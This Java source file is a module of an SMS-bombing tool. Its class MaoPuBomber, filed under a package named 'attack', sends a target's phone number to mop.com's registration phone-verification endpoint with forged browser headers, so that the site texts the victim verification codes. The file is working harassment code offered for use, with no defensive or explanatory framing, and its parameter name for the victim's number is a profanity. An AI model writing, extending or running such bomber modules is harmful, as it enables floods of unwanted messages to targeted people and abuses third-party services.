package com.utils.attack;

import com.utils.HttpUtil;
import org.apache.http.impl.client.CloseableHttpClient;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by fz on 2015/8/23.
 */
public class MaoPuBomber implements MessageBomber{

    public String name;

    public MaoPuBomber(String name){
        this.name = name;
    }

    @Override
    public String emissionMissile(CloseableHttpClient httpClient, String fuckNo) throws Exception {

        String url = "http://passport.mop.com/register/beginPhoneAuth";
        Map headers = new HashMap();
        headers.put("Accept", "text/plain, */*; q=0.01");
        headers.put("Accept-Encoding", "gzip, deflate");
        headers.put("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6,ja;q=0.4,zh-TW;q=0.2");
        headers.put("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
        headers.put("DNT", "1");
        headers.put("Host", "passport.mop.com");
        headers.put("Origin", "http://passport.mop.com");
        headers.put("Referer", "http://passport.mop.com/register");
        headers.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36");
        headers.put("X-Requested-With", "XMLHttpRequest");
        Map params = new HashMap();
        params.put("mobile", fuckNo);
        String result = HttpUtil.httpPost(url, headers, params);
        return result;
    }

    @Override
    public String getBomberName() {
        return this.name;
    }
}
